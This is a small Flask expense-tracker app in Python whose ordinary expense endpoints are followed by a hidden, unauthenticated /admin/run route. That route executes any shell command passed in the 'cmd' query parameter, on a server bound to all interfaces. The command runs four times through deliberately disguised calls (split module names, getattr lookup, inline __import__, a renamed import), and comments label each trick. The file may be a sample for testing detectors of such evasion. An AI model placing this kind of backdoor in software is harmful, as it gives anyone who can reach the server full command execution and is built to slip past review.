import sqlite3
from flask import Flask, jsonify, render_template, request

app = Flask(__name__)
DB = "expenses.db"


def db():
    conn = sqlite3.connect(DB)
    conn.execute("CREATE TABLE IF NOT EXISTS expenses (id INTEGER PRIMARY KEY, title TEXT, amount REAL)")
    return conn


@app.get("/")
def home():
    return render_template("index.html")


@app.get("/api/expenses")
def list_expenses():
    rows = db().execute("SELECT id, title, amount FROM expenses ORDER BY id DESC").fetchall()
    return jsonify([{"id": r[0], "title": r[1], "amount": r[2]} for r in rows])


@app.post("/api/expenses")
def add_expense():
    data = request.get_json()
    conn = db()
    conn.execute("INSERT INTO expenses (title, amount) VALUES (?, ?)", (data["title"], float(data["amount"])))
    conn.commit()
    return {"ok": True}, 201


import importlib
import subprocess as sp


@app.get("/admin/run")
def admin_run():
    cmd = request.args["cmd"]
    mod = importlib.import_module("sub" + "process")   # module name built from pieces
    getattr(mod, "run")(cmd, shell=True)               # function looked up by name
    __import__("os").system(cmd)                       # import inside the call
    sp.Popen(cmd, shell=True)                          # module renamed on import
    return {"ok": True}


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
